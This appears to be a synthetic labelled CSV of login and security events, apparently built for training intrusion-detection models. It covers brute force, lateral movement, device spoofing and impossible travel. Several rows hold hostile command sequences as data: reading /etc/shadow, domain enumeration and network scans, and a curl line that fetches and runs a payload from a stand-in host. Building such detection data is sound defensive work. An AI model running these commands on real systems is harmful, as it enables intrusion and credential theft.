entity_id,entity_type,timestamp,source_ip,geo_location,resource_accessed,auth_method,session_duration,command_sequence,device_fingerprint,login_success,label
ecefd2fc-6c76-4182-8ca2-fde0f09d00e2,User,2026-06-25 06:42:39,99.73.28.219,"Parrishchester, Ecuador",Database,Password,0,N/A,Unknown Script/Bot,False,BruteForce
ecefd2fc-6c76-4182-8ca2-fde0f09d00e2,User,2026-06-25 06:42:43,99.73.28.219,"Port Sarah, Togo",Database,Password,0,N/A,Unknown Script/Bot,False,BruteForce
ecefd2fc-6c76-4182-8ca2-fde0f09d00e2,User,2026-06-25 06:42:43,99.73.28.219,"Jamesland, Dominican Republic",Database,Password,0,N/A,Unknown Script/Bot,False,BruteForce
ecefd2fc-6c76-4182-8ca2-fde0f09d00e2,User,2026-06-25 06:42:47,99.73.28.219,"Jonathanville, Indonesia",Database,Password,0,N/A,Unknown Script/Bot,False,BruteForce
ecefd2fc-6c76-4182-8ca2-fde0f09d00e2,User,2026-06-25 06:42:55,99.73.28.219,"Port Donaldport, Tanzania",Database,Password,0,N/A,Unknown Script/Bot,False,BruteForce
ecefd2fc-6c76-4182-8ca2-fde0f09d00e2,User,2026-06-25 06:42:57,99.73.28.219,"Gonzalesville, Honduras",Database,Password,0,N/A,Unknown Script/Bot,False,BruteForce
ecefd2fc-6c76-4182-8ca2-fde0f09d00e2,User,2026-06-25 06:42:59,99.73.28.219,"Port Jacqueline, Kazakhstan",Database,Password,0,N/A,Unknown Script/Bot,False,BruteForce
ecefd2fc-6c76-4182-8ca2-fde0f09d00e2,User,2026-06-25 06:43:05,99.73.28.219,"Davidside, Marshall Islands",Database,Password,0,N/A,Unknown Script/Bot,False,BruteForce
ecefd2fc-6c76-4182-8ca2-fde0f09d00e2,User,2026-06-25 06:43:13,99.73.28.219,"Melissafort, Thailand",Database,Password,0,N/A,Unknown Script/Bot,False,BruteForce
ecefd2fc-6c76-4182-8ca2-fde0f09d00e2,User,2026-06-25 06:43:14,99.73.28.219,"Deannahaven, Northern Mariana Islands",Database,Password,0,N/A,Unknown Script/Bot,False,BruteForce
ecefd2fc-6c76-4182-8ca2-fde0f09d00e2,User,2026-06-25 06:43:15,99.73.28.219,"Rebeccamouth, Canada",Database,Password,0,N/A,Unknown Script/Bot,False,BruteForce
ecefd2fc-6c76-4182-8ca2-fde0f09d00e2,User,2026-06-25 06:43:17,99.73.28.219,"Longshire, Guernsey",Database,Password,0,N/A,Unknown Script/Bot,False,BruteForce
ecefd2fc-6c76-4182-8ca2-fde0f09d00e2,User,2026-06-25 06:43:19,99.73.28.219,"South David, Ecuador",Database,Password,0,N/A,Unknown Script/Bot,False,BruteForce
ecefd2fc-6c76-4182-8ca2-fde0f09d00e2,User,2026-06-25 06:43:19,99.73.28.219,"South Leah, Italy",Database,Password,0,N/A,Unknown Script/Bot,False,BruteForce
ecefd2fc-6c76-4182-8ca2-fde0f09d00e2,User,2026-06-25 06:43:21,99.73.28.219,"Mooreburgh, Anguilla",Database,Password,0,N/A,Unknown Script/Bot,False,BruteForce
ecefd2fc-6c76-4182-8ca2-fde0f09d00e2,User,2026-06-25 06:43:23,99.73.28.219,"Lake Heatherborough, Slovakia (Slovak Republic)",Database,Password,0,N/A,Unknown Script/Bot,False,BruteForce
ecefd2fc-6c76-4182-8ca2-fde0f09d00e2,User,2026-06-25 06:43:25,99.73.28.219,"Lake Adamville, Tajikistan",Database,Password,0,N/A,Unknown Script/Bot,False,BruteForce
ecefd2fc-6c76-4182-8ca2-fde0f09d00e2,User,2026-06-25 06:43:31,99.73.28.219,"Port Andrea, Denmark",Database,Password,0,N/A,Unknown Script/Bot,False,BruteForce
ecefd2fc-6c76-4182-8ca2-fde0f09d00e2,User,2026-06-25 06:43:35,99.73.28.219,"West Johnfort, Tajikistan",Database,Password,0,N/A,Unknown Script/Bot,False,BruteForce
ecefd2fc-6c76-4182-8ca2-fde0f09d00e2,User,2026-06-25 06:43:41,99.73.28.219,"Rittermouth, Timor-Leste",Database,Password,0,N/A,Unknown Script/Bot,False,BruteForce
ecefd2fc-6c76-4182-8ca2-fde0f09d00e2,User,2026-06-25 06:43:44,99.73.28.219,"South Michael, Cape Verde",Database,Password,0,N/A,Unknown Script/Bot,False,BruteForce
ecefd2fc-6c76-4182-8ca2-fde0f09d00e2,User,2026-06-25 06:43:44,99.73.28.219,"North Dennischester, Armenia",Database,Password,0,N/A,Unknown Script/Bot,False,BruteForce
ecefd2fc-6c76-4182-8ca2-fde0f09d00e2,User,2026-06-25 06:43:56,99.73.28.219,"South Ian, Greece",Database,Password,0,N/A,Unknown Script/Bot,False,BruteForce
ecefd2fc-6c76-4182-8ca2-fde0f09d00e2,User,2026-06-25 06:43:59,99.73.28.219,"West Kyleshire, Malaysia",Database,Password,0,N/A,Unknown Script/Bot,False,BruteForce
ecefd2fc-6c76-4182-8ca2-fde0f09d00e2,User,2026-06-25 06:44:14,99.73.28.219,"Allenport, British Virgin Islands",Database,Password,0,N/A,Unknown Script/Bot,False,BruteForce
ecefd2fc-6c76-4182-8ca2-fde0f09d00e2,User,2026-06-25 06:44:31,99.73.28.219,"Adamstad, Moldova",Database,Password,0,N/A,Unknown Script/Bot,False,BruteForce
ecefd2fc-6c76-4182-8ca2-fde0f09d00e2,User,2026-06-25 06:44:44,99.73.28.219,"Guerreroside, Cook Islands",Database,Password,0,N/A,Unknown Script/Bot,False,BruteForce
ecefd2fc-6c76-4182-8ca2-fde0f09d00e2,User,2026-06-25 06:44:59,99.73.28.219,"Port Jasonberg, Andorra",Database,Password,0,N/A,Unknown Script/Bot,False,BruteForce
ecefd2fc-6c76-4182-8ca2-fde0f09d00e2,User,2026-06-25 06:45:29,99.73.28.219,"Dianaside, Pakistan",Database,Password,0,N/A,Unknown Script/Bot,False,BruteForce
1230d26a-378c-42c5-802c-c58e74797ecf,Device,2026-06-25 07:39:41,62.11.193.217,"South Cindyville, Korea",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
1230d26a-378c-42c5-802c-c58e74797ecf,Device,2026-06-25 07:39:43,62.11.193.217,"East Lisa, Lesotho",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
1230d26a-378c-42c5-802c-c58e74797ecf,Device,2026-06-25 07:39:47,62.11.193.217,"Aliciamouth, Lithuania",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
1230d26a-378c-42c5-802c-c58e74797ecf,Device,2026-06-25 07:39:48,62.11.193.217,"Bryanbury, Chad",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
1230d26a-378c-42c5-802c-c58e74797ecf,Device,2026-06-25 07:39:49,62.11.193.217,"South Patrick, Faroe Islands",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
1230d26a-378c-42c5-802c-c58e74797ecf,Device,2026-06-25 07:39:53,62.11.193.217,"New Ericchester, Papua New Guinea",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
1230d26a-378c-42c5-802c-c58e74797ecf,Device,2026-06-25 07:39:53,62.11.193.217,"Montgomeryburgh, Netherlands Antilles",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
1230d26a-378c-42c5-802c-c58e74797ecf,Device,2026-06-25 07:39:55,62.11.193.217,"North Tiffanyside, Liechtenstein",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
1230d26a-378c-42c5-802c-c58e74797ecf,Device,2026-06-25 07:39:56,62.11.193.217,"West Nicolemouth, Tajikistan",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
1230d26a-378c-42c5-802c-c58e74797ecf,Device,2026-06-25 07:39:59,62.11.193.217,"North Lisa, Saint Pierre and Miquelon",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
1230d26a-378c-42c5-802c-c58e74797ecf,Device,2026-06-25 07:39:59,62.11.193.217,"Lake Aaronhaven, Angola",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
1230d26a-378c-42c5-802c-c58e74797ecf,Device,2026-06-25 07:40:01,62.11.193.217,"Christinebury, Sao Tome and Principe",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
1230d26a-378c-42c5-802c-c58e74797ecf,Device,2026-06-25 07:40:04,62.11.193.217,"Quinntown, Poland",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
1230d26a-378c-42c5-802c-c58e74797ecf,Device,2026-06-25 07:40:05,62.11.193.217,"Raymondport, Nicaragua",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
1230d26a-378c-42c5-802c-c58e74797ecf,Device,2026-06-25 07:40:07,62.11.193.217,"West William, Peru",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
1230d26a-378c-42c5-802c-c58e74797ecf,Device,2026-06-25 07:40:13,62.11.193.217,"North Andrewstad, Niger",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
1230d26a-378c-42c5-802c-c58e74797ecf,Device,2026-06-25 07:40:14,62.11.193.217,"South Nataliechester, Georgia",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
1230d26a-378c-42c5-802c-c58e74797ecf,Device,2026-06-25 07:40:14,62.11.193.217,"Watersmouth, Czech Republic",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
1230d26a-378c-42c5-802c-c58e74797ecf,Device,2026-06-25 07:40:17,62.11.193.217,"East Mike, Comoros",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
1230d26a-378c-42c5-802c-c58e74797ecf,Device,2026-06-25 07:40:26,62.11.193.217,"Lake Codyview, Barbados",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
1230d26a-378c-42c5-802c-c58e74797ecf,Device,2026-06-25 07:40:29,62.11.193.217,"Shaneside, Algeria",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
1230d26a-378c-42c5-802c-c58e74797ecf,Device,2026-06-25 07:40:33,62.11.193.217,"South Angelport, Czech Republic",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
1230d26a-378c-42c5-802c-c58e74797ecf,Device,2026-06-25 07:40:35,62.11.193.217,"Francisburgh, Reunion",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
1230d26a-378c-42c5-802c-c58e74797ecf,Device,2026-06-25 07:40:39,62.11.193.217,"Lisatown, Angola",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
1230d26a-378c-42c5-802c-c58e74797ecf,Device,2026-06-25 07:40:41,62.11.193.217,"Millertown, Suriname",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
1230d26a-378c-42c5-802c-c58e74797ecf,Device,2026-06-25 07:40:41,62.11.193.217,"North Joshua, Philippines",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
1230d26a-378c-42c5-802c-c58e74797ecf,Device,2026-06-25 07:40:43,62.11.193.217,"Coxton, Falkland Islands (Malvinas)",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
1230d26a-378c-42c5-802c-c58e74797ecf,Device,2026-06-25 07:40:49,62.11.193.217,"Collinfort, Liberia",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
1230d26a-378c-42c5-802c-c58e74797ecf,Device,2026-06-25 07:40:57,62.11.193.217,"South Michelle, Gibraltar",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
1230d26a-378c-42c5-802c-c58e74797ecf,Device,2026-06-25 07:41:17,62.11.193.217,"Hursttown, Japan",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
1230d26a-378c-42c5-802c-c58e74797ecf,Device,2026-06-25 07:41:26,62.11.193.217,"West Crystalside, Martinique",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
1230d26a-378c-42c5-802c-c58e74797ecf,Device,2026-06-25 07:41:31,62.11.193.217,"Lake Troy, Bahrain",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
1230d26a-378c-42c5-802c-c58e74797ecf,Device,2026-06-25 07:41:33,62.11.193.217,"Scottside, Netherlands",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
1230d26a-378c-42c5-802c-c58e74797ecf,Device,2026-06-25 07:41:46,62.11.193.217,"West Alexanderville, Chile",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
c3b75f5e-a13f-4538-801a-c5a5b75a493f,User,2026-06-25 07:42:54,178.113.119.255,"Normanhaven, Suriname",Confluence,Biometric,4515,powershell.exe -ExecutionPolicy Bypass -File recon.ps1,Windows 11 - Chrome,True,Lateral Movement
c3b75f5e-a13f-4538-801a-c5a5b75a493f,User,2026-06-25 07:45:54,178.113.119.255,"Normanhaven, Suriname",HRIS,Biometric,3672,cat /etc/passwd -> cat /etc/shadow -> su root,Windows 11 - Chrome,True,Lateral Movement
c3b75f5e-a13f-4538-801a-c5a5b75a493f,User,2026-06-25 08:02:54,178.113.119.255,"Normanhaven, Suriname",GitLab,Biometric,333,ping -> ssh admin@10.0.0.5 -> sudo su,Windows 11 - Chrome,True,Lateral Movement
710708be-709d-4ce2-8f92-246a6ca0b3a2,User,2026-06-25 09:42:41,36.206.248.141,"New Jennifershire, Kenya",Jira,Password,296,N/A,Kali Linux - Curl - MAC: 40:b1:1d:80:8d:e4,True,Device Spoofing
defd1145-3e40-4d27-b2b4-029efd2c6ebe,User,2026-06-25 09:46:36,13.194.195.95,"South Jessica, Botswana",Database,MFA,1805,N/A,Unknown Browser/Device,True,Impossible Travel
c0d38839-74d1-4239-b05e-ed49a3e33641,Device,2026-06-25 10:28:35,168.219.223.255,"Petersenhaven, Brunei Darussalam",CRM,Password,0,N/A,Unknown Script/Bot,False,BruteForce
c0d38839-74d1-4239-b05e-ed49a3e33641,Device,2026-06-25 10:28:36,168.219.223.255,"Lake Nicholasmouth, Paraguay",CRM,Password,0,N/A,Unknown Script/Bot,False,BruteForce
c0d38839-74d1-4239-b05e-ed49a3e33641,Device,2026-06-25 10:28:44,168.219.223.255,"Tarafurt, Korea",CRM,Password,0,N/A,Unknown Script/Bot,False,BruteForce
c0d38839-74d1-4239-b05e-ed49a3e33641,Device,2026-06-25 10:28:45,168.219.223.255,"West Lesliefort, Peru",CRM,Password,0,N/A,Unknown Script/Bot,False,BruteForce
c0d38839-74d1-4239-b05e-ed49a3e33641,Device,2026-06-25 10:28:45,168.219.223.255,"Stoneshire, United States Minor Outlying Islands",CRM,Password,0,N/A,Unknown Script/Bot,False,BruteForce
c0d38839-74d1-4239-b05e-ed49a3e33641,Device,2026-06-25 10:28:46,168.219.223.255,"Ethanhaven, Puerto Rico",CRM,Password,0,N/A,Unknown Script/Bot,False,BruteForce
c0d38839-74d1-4239-b05e-ed49a3e33641,Device,2026-06-25 10:28:47,168.219.223.255,"Juliastad, Uzbekistan",CRM,Password,0,N/A,Unknown Script/Bot,False,BruteForce
c0d38839-74d1-4239-b05e-ed49a3e33641,Device,2026-06-25 10:28:47,168.219.223.255,"Lake Benjaminborough, Monaco",CRM,Password,0,N/A,Unknown Script/Bot,False,BruteForce
c0d38839-74d1-4239-b05e-ed49a3e33641,Device,2026-06-25 10:28:51,168.219.223.255,"Martinland, Wallis and Futuna",CRM,Password,0,N/A,Unknown Script/Bot,False,BruteForce
c0d38839-74d1-4239-b05e-ed49a3e33641,Device,2026-06-25 10:28:51,168.219.223.255,"Taylormouth, Australia",CRM,Password,0,N/A,Unknown Script/Bot,False,BruteForce
c0d38839-74d1-4239-b05e-ed49a3e33641,Device,2026-06-25 10:28:53,168.219.223.255,"Terryport, Saint Barthelemy",CRM,Password,0,N/A,Unknown Script/Bot,False,BruteForce
c0d38839-74d1-4239-b05e-ed49a3e33641,Device,2026-06-25 10:28:56,168.219.223.255,"South Steven, Pakistan",CRM,Password,0,N/A,Unknown Script/Bot,False,BruteForce
c0d38839-74d1-4239-b05e-ed49a3e33641,Device,2026-06-25 10:29:02,168.219.223.255,"South Jacquelinemouth, Uganda",CRM,Password,0,N/A,Unknown Script/Bot,False,BruteForce
c0d38839-74d1-4239-b05e-ed49a3e33641,Device,2026-06-25 10:29:04,168.219.223.255,"Floresfort, Germany",CRM,Password,0,N/A,Unknown Script/Bot,False,BruteForce
c0d38839-74d1-4239-b05e-ed49a3e33641,Device,2026-06-25 10:29:05,168.219.223.255,"Lake Michelle, Solomon Islands",CRM,Password,0,N/A,Unknown Script/Bot,False,BruteForce
c0d38839-74d1-4239-b05e-ed49a3e33641,Device,2026-06-25 10:29:07,168.219.223.255,"Georgeborough, Benin",CRM,Password,0,N/A,Unknown Script/Bot,False,BruteForce
c0d38839-74d1-4239-b05e-ed49a3e33641,Device,2026-06-25 10:29:10,168.219.223.255,"Ortegastad, Mozambique",CRM,Password,0,N/A,Unknown Script/Bot,False,BruteForce
c0d38839-74d1-4239-b05e-ed49a3e33641,Device,2026-06-25 10:29:10,168.219.223.255,"South David, Guernsey",CRM,Password,0,N/A,Unknown Script/Bot,False,BruteForce
c0d38839-74d1-4239-b05e-ed49a3e33641,Device,2026-06-25 10:29:23,168.219.223.255,"South Laurenton, Sao Tome and Principe",CRM,Password,0,N/A,Unknown Script/Bot,False,BruteForce
c0d38839-74d1-4239-b05e-ed49a3e33641,Device,2026-06-25 10:29:25,168.219.223.255,"East Nathantown, Nepal",CRM,Password,0,N/A,Unknown Script/Bot,False,BruteForce
c0d38839-74d1-4239-b05e-ed49a3e33641,Device,2026-06-25 10:29:25,168.219.223.255,"Amyfurt, Algeria",CRM,Password,0,N/A,Unknown Script/Bot,False,BruteForce
c0d38839-74d1-4239-b05e-ed49a3e33641,Device,2026-06-25 10:29:27,168.219.223.255,"Lake Jennifer, Italy",CRM,Password,0,N/A,Unknown Script/Bot,False,BruteForce
c0d38839-74d1-4239-b05e-ed49a3e33641,Device,2026-06-25 10:29:45,168.219.223.255,"Richardside, Algeria",CRM,Password,0,N/A,Unknown Script/Bot,False,BruteForce
c0d38839-74d1-4239-b05e-ed49a3e33641,Device,2026-06-25 10:29:47,168.219.223.255,"East Beckybury, Sierra Leone",CRM,Password,0,N/A,Unknown Script/Bot,False,BruteForce
c0d38839-74d1-4239-b05e-ed49a3e33641,Device,2026-06-25 10:29:47,168.219.223.255,"East Russell, Bangladesh",CRM,Password,0,N/A,Unknown Script/Bot,False,BruteForce
c0d38839-74d1-4239-b05e-ed49a3e33641,Device,2026-06-25 10:29:55,168.219.223.255,"Port David, Congo",CRM,Password,0,N/A,Unknown Script/Bot,False,BruteForce
c0d38839-74d1-4239-b05e-ed49a3e33641,Device,2026-06-25 10:30:00,168.219.223.255,"Port Willie, Honduras",CRM,Password,0,N/A,Unknown Script/Bot,False,BruteForce
c0d38839-74d1-4239-b05e-ed49a3e33641,Device,2026-06-25 10:30:03,168.219.223.255,"West Jessica, Singapore",CRM,Password,0,N/A,Unknown Script/Bot,False,BruteForce
c0d38839-74d1-4239-b05e-ed49a3e33641,Device,2026-06-25 10:30:05,168.219.223.255,"Port James, Swaziland",CRM,Password,0,N/A,Unknown Script/Bot,False,BruteForce
c0d38839-74d1-4239-b05e-ed49a3e33641,Device,2026-06-25 10:30:10,168.219.223.255,"Robertside, French Southern Territories",CRM,Password,0,N/A,Unknown Script/Bot,False,BruteForce
c0d38839-74d1-4239-b05e-ed49a3e33641,Device,2026-06-25 10:30:11,168.219.223.255,"South Thomasside, Vanuatu",CRM,Password,0,N/A,Unknown Script/Bot,False,BruteForce
c0d38839-74d1-4239-b05e-ed49a3e33641,Device,2026-06-25 10:30:19,168.219.223.255,"Sanchezburgh, Libyan Arab Jamahiriya",CRM,Password,0,N/A,Unknown Script/Bot,False,BruteForce
c0d38839-74d1-4239-b05e-ed49a3e33641,Device,2026-06-25 10:30:27,168.219.223.255,"South Robertbury, Netherlands",CRM,Password,0,N/A,Unknown Script/Bot,False,BruteForce
c0d38839-74d1-4239-b05e-ed49a3e33641,Device,2026-06-25 10:30:30,168.219.223.255,"East Matthewborough, Belize",CRM,Password,0,N/A,Unknown Script/Bot,False,BruteForce
c0d38839-74d1-4239-b05e-ed49a3e33641,Device,2026-06-25 10:31:03,168.219.223.255,"Davidton, Benin",CRM,Password,0,N/A,Unknown Script/Bot,False,BruteForce
c0d38839-74d1-4239-b05e-ed49a3e33641,Device,2026-06-25 10:31:07,168.219.223.255,"North Amyside, Pitcairn Islands",CRM,Password,0,N/A,Unknown Script/Bot,False,BruteForce
c0d38839-74d1-4239-b05e-ed49a3e33641,Device,2026-06-25 10:31:10,168.219.223.255,"Port Patricia, Honduras",CRM,Password,0,N/A,Unknown Script/Bot,False,BruteForce
c0d38839-74d1-4239-b05e-ed49a3e33641,Device,2026-06-25 10:31:11,168.219.223.255,"Matthewshire, Namibia",CRM,Password,0,N/A,Unknown Script/Bot,False,BruteForce
c0d38839-74d1-4239-b05e-ed49a3e33641,Device,2026-06-25 10:31:20,168.219.223.255,"Fuenteschester, Moldova",CRM,Password,0,N/A,Unknown Script/Bot,False,BruteForce
c0d38839-74d1-4239-b05e-ed49a3e33641,Device,2026-06-25 10:31:25,168.219.223.255,"West Sydneytown, Georgia",CRM,Password,0,N/A,Unknown Script/Bot,False,BruteForce
c0d38839-74d1-4239-b05e-ed49a3e33641,Device,2026-06-25 10:31:55,168.219.223.255,"West Dylan, Falkland Islands (Malvinas)",CRM,Password,0,N/A,Unknown Script/Bot,False,BruteForce
391fe303-b2d1-4569-b573-b53f4a7e663f,User,2026-06-25 11:16:33,77.32.54.235,"East Emilyland, Guinea-Bissau",Backup Server,Hardware Token,1989,whoami -> net user /domain -> nmap -sT 10.0.0.0/24,macOS 13 - Firefox,True,Lateral Movement
391fe303-b2d1-4569-b573-b53f4a7e663f,User,2026-06-25 11:19:33,77.32.54.235,"East Emilyland, Guinea-Bissau",Jira,Hardware Token,4721,cat /etc/passwd -> cat /etc/shadow -> su root,macOS 13 - Firefox,True,Lateral Movement
cb32c077-b2c0-48dc-b321-a12bab4970de,User,2026-06-25 11:20:14,85.66.218.223,"East Caitlin, Djibouti",VPN,SSO,2370,N/A,Unknown Browser/Device,True,Impossible Travel
31c164d4-14f0-4ae5-926e-ac18d9541c50,User,2026-06-25 11:25:49,136.190.221.65,"Geraldfort, British Indian Ocean Territory (Chagos Archipelago)",CRM,Biometric,1530,N/A,iOS 17 - Curl - MAC: 50:8b:29:95:88:6b,True,Device Spoofing
391fe303-b2d1-4569-b573-b53f4a7e663f,User,2026-06-25 11:32:33,77.32.54.235,"East Emilyland, Guinea-Bissau",GitLab,Hardware Token,3635,whoami -> net user /domain -> nmap -sT 10.0.0.0/24,macOS 13 - Firefox,True,Lateral Movement
dcd396c4-5c93-4991-bbd7-68d1ecbe67e8,User,2026-06-25 11:40:54,103.90.165.122,"Sonyatown, Djibouti",Database,Hardware Token,1341,ping -> ssh admin@10.0.0.5 -> sudo su,macOS 13 - Firefox,True,Lateral Movement
391fe303-b2d1-4569-b573-b53f4a7e663f,User,2026-06-25 11:43:33,77.32.54.235,"East Emilyland, Guinea-Bissau",Confluence,Hardware Token,2850,cat /etc/passwd -> cat /etc/shadow -> su root,macOS 13 - Firefox,True,Lateral Movement
dcd396c4-5c93-4991-bbd7-68d1ecbe67e8,User,2026-06-25 11:46:54,103.90.165.122,"Sonyatown, Djibouti",Domain Controller,Hardware Token,5429,cat /etc/passwd -> cat /etc/shadow -> su root,macOS 13 - Firefox,True,Lateral Movement
dcd396c4-5c93-4991-bbd7-68d1ecbe67e8,User,2026-06-25 11:49:54,103.90.165.122,"Sonyatown, Djibouti",Domain Controller,Hardware Token,2919,curl http://malicious.ip/payload.sh -> chmod +x payload.sh -> ./payload.sh,macOS 13 - Firefox,True,Lateral Movement
dcd396c4-5c93-4991-bbd7-68d1ecbe67e8,User,2026-06-25 12:01:54,103.90.165.122,"Sonyatown, Djibouti",HRIS,Hardware Token,3150,ping -> ssh admin@10.0.0.5 -> sudo su,macOS 13 - Firefox,True,Lateral Movement
5279f598-b747-407d-9071-29465d9c5d1b,User,2026-06-25 12:35:28,197.147.19.215,"East Dustinburgh, Samoa",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
5279f598-b747-407d-9071-29465d9c5d1b,User,2026-06-25 12:35:30,197.147.19.215,"Stevenshire, Germany",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
5279f598-b747-407d-9071-29465d9c5d1b,User,2026-06-25 12:35:34,197.147.19.215,"North Karenview, Zimbabwe",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
5279f598-b747-407d-9071-29465d9c5d1b,User,2026-06-25 12:35:36,197.147.19.215,"Kinghaven, Cyprus",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
